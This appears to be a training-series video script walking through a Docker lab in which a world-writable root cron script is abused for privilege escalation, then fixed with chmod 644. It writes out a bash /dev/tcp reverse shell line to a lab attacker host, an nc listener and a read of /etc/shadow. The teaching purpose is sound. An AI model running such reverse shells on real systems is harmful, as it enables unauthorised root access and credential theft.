# Day 26 — Root Shell From a World-Writable Cron Script — Video Script

**Estimated length:** ~12 minutes (~1800 words)

## Hook

I logged in as a nobody account — uid 1000, zero special rights, the kind of account you'd get from any throwaway foothold on a box. Sixty seconds later I had a root shell and was reading `/etc/shadow`. No exploit code. No memory corruption. No clever trick at all. One file had the wrong permission bit set, and that was the entire attack.

[SCREEN: title card — "Day 26: Cron Privilege Escalation — Exploit and Fix"]

## Intro

This is Day 26 of my cybersecurity training series, and it's the capstone lab for Phase 5 — Identity and Access Management. Everything in this phase has been about who gets to do what: authentication, authorization, credential attacks. Today is the payoff lab — a real, hands-on privilege escalation from a low-privilege user all the way to root, built and run for real in isolated Docker containers, not simulated. By the end, you'll understand exactly why "who can write to this file" is a security question just as important as "who can run this program."

## Teaching segment: what privilege escalation actually means here

Quick refresher, because this series has drawn this distinction before: vertical privilege escalation means going from a lower privilege level to a higher one — user to root, for instance. Horizontal privilege escalation means staying at the same privilege level but accessing someone else's stuff, like changing a user ID in a URL to view another account's data. Today is a clean vertical example.

[SCREEN: two-column card — Vertical (user→root) vs. Horizontal (user→other user, same level)]

The setup: a container running `cron`, Linux's task scheduler, as PID 1 — meaning it's genuinely running as root the whole time, the same way it would on a real server. Cron had one job: run `/opt/cleanup.sh` every minute, as root. That script was owned by root. But its permissions were set to `777` — read, write, and execute for literally everyone, not just the owner. And there was a second, low-privilege account on the box called `lowpriv`, standing in for "an attacker who already got some kind of foothold here" — a web shell, a leaked credential, anything. It doesn't matter how they got in; what matters is what they can do once they're in.

## Teaching segment: finding and reading the misconfiguration

[SCREEN: terminal — `cat /etc/cron.d/cleanup-cron` and `ls -la /opt/cleanup.sh`]

The first move, as the low-privilege user, was just looking. `cat /etc/cron.d/cleanup-cron` showed the scheduled job: run `/opt/cleanup.sh` every minute, as the user `root`. Then `ls -la /opt/cleanup.sh` showed the permission string: `-rwxrwxrwx`, owned by `root:root`. That last `rwx` — the "other" permission group, meaning everyone who isn't the owner or in the owning group — is the entire vulnerability. Cron doesn't care who last touched that file. It only cares what the file contains at the moment it fires, and it runs that content as root, no questions asked.

## Teaching segment: weaponizing it with a reverse shell

[SCREEN: terminal — `echo 'bash -i >& /dev/tcp/cron-privesc-attacker/4444 0>&1' >> /opt/cleanup.sh`]

As `lowpriv`, with write access to a file root was going to execute, the move was simple: append one line to the end of the script.

`bash -i >& /dev/tcp/cron-privesc-attacker/4444 0>&1`

Breaking that down, because it looks like gibberish the first time you see it: `bash -i` starts an interactive shell — one that reads commands and shows prompts, instead of running a single command and quitting. `/dev/tcp/host/port` is a bash built-in — it's not a real file on disk, it's a special path that, when opened, actually opens a TCP connection to that host and port. `>&` redirects both normal output and error output into that connection, and `0>&1` sends input through it too. Put together: open a network connection to the attacker's machine, and hand over a fully interactive shell through it.

This is called a reverse shell specifically because the compromised machine initiates the outbound connection to the attacker, rather than the attacker connecting inbound — which matters in the real world because outbound connections usually sail right past firewall rules that are only watching for inbound ones.

On the attacker side, a netcat listener — `nc -lvnp 4444` — was just sitting there waiting. Sixty seconds after the payload went in, cron fired, ran the script as root, hit that line, and the listener caught the connection.

[SCREEN: terminal output — "Connection received on 172.19.0.2 47852"]

## Teaching segment: confirming root

[SCREEN: terminal — `whoami`, `id`, `cat /etc/shadow | head -3`]

Three commands told the whole story. `whoami` returned `root`. `id` returned `uid=0(root) gid=0(root) groups=0(root)` — uid 0 is the actual definition of root on Linux, not just a label. And `cat /etc/shadow`, a file that holds password hashes and is normally completely unreadable by anyone except root, printed right out. That's the proof: a uid-1000 account with no special rights turned into full root, through nothing more exotic than a wrong permission bit.

## Mistake/correction moment

Before even getting to the fix, a genuinely good question came up mid-lab: if that payload line is still sitting in the script, won't cron just keep firing it every minute — and wouldn't that get noticed? Two-part answer. Mechanically, the netcat listener used in this lab only accepts one connection at a time, so later cron ticks trying to reconnect just get refused — no pile of extra shells. But the bigger point stands regardless: in a real environment, a maintenance script that normally just writes a log line suddenly spawning an interactive shell with an open network socket, every single minute, is an extremely loud behavioral signature. Endpoint monitoring and process-execution logging are built to catch exactly that kind of anomaly. That's a direct preview of Phase 7 — Detection — later in this course: persistence versus noise is a real tradeoff attackers have to make, and defenders have tools specifically built to notice it.

[SCREEN: caption — "nc without -k only catches one connection — but the real lesson is about noise, not netcat"]

## Teaching segment: the fix, and proving it works

[SCREEN: terminal — `chmod 644 /opt/cleanup.sh`, then `ls -la` showing `-rw-r--r--`]

The fix addresses the actual root cause, not a symptom: `chmod 644 /opt/cleanup.sh`. That leaves root with read and write, and everyone else with read-only. No more "other" write bit.

And then, the part that matters most — not just asserting the fix works, but proving it. Back as `lowpriv`, trying to append that same payload line again:

[SCREEN: terminal — `bash: /opt/cleanup.sh: Permission denied`]

`Permission denied`. The low-privilege account still exists, still has an interactive shell on the box the entire time — removing the account was never the fix — but it can no longer touch the one file that mattered. The privilege escalation path is closed, not because the attacker lost access to the machine, but because they lost write access to the one thing root blindly trusted.

## Recap + quiz

Three takeaways. One: the vulnerability here was never cron itself — cron did exactly what it was configured to do. The vulnerability was a file permission that let the wrong user write to something root would execute. Two: fixing the permission doesn't require removing the low-privilege account or revoking its shell access — it just has to stop that account from being able to rewrite what root trusts. Three: when you can't fix a root-cause issue immediately, you can still reduce risk with a compensating control — but it matters whether that control actually blocks the exposure or just removes one arbitrary detail of this specific attack, like a port number.

Here are today's three review questions — pause and think before I give the answers:

First: in this lab, what was the actual vulnerability — was it cron, the reverse shell technique, or something else? Be specific.

Second: the fixed script went from `777` to `644`. Why did that stop the attack, given that the low-privilege account still had an active shell on the machine the entire time?

Third: if you found a world-writable, root-run script on a real server but couldn't fix the permission immediately due to a change-control window, what's a reasonable interim mitigation — and why wouldn't blocking a specific port number be a good answer?

[SCREEN: three questions, pause-and-think card]

## Outro / CTA

The operational takeaway from today: always check who can write to a file before trusting who's allowed to run it — in a scheduled-task setup, the real privilege boundary is the write permission on the script, not the account the job runs as. This lab completes Phase 5 — identity, access, credential attacks, and now privilege escalation, all taught and all lab-exercised for real. Next session moves into Phase 6: Cloud Security — shared responsibility, cloud IAM, and the misconfigurations that show up constantly in real breach reports. Follow along for that, and drop a comment with your answer to the compensating-control question — I got it wrong on my own first pass today, so I want to see who nails it faster than I did.

## On-screen text / b-roll suggestions

- Lower-third: "Day 26 — Cron Privilege Escalation (Phase 5 capstone, real lab)"
- Caption overlay during hook: "uid 1000 to uid 0 in under a minute. No exploit code — just one bad permission."
- Diagram: Vertical vs. Horizontal privilege escalation two-column card
- Terminal capture: `ls -la /opt/cleanup.sh` showing `-rwxrwxrwx`
- Terminal capture: the reverse shell payload line, annotated piece by piece
- Terminal capture: `id` showing `uid=0(root)` and the `/etc/shadow` read
- Caption: "Removing the account isn't the fix. Removing its write access is."
- Terminal capture: `Permission denied` after the fix, side by side with the earlier successful write
- End card: subscribe + "Next: Phase 6 — Cloud Security"
